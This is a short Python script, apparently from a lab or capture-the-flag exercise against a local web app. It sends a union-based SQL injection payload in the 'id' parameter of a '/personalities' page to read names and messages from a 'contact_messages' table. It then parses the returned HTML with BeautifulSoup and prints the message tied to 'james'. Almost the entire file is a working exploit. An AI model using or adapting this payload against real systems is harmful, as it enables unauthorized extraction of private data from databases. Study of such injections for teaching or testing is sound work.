#%%
import requests
from bs4 import BeautifulSoup
#%%
pload_a = {
    'id': "' UNION SELECT name,message as id FROM contact_messages WHERE '1'='1" 
}
resp_a = requests.get('http://localhost:80/personalities', params=pload_a)
print(resp_a.status_code)
#%%
name_to_message = dict(item.string.split(':') for item in BeautifulSoup(resp_a.content).find_all("a", "list-group-item"))
print(name_to_message['james'])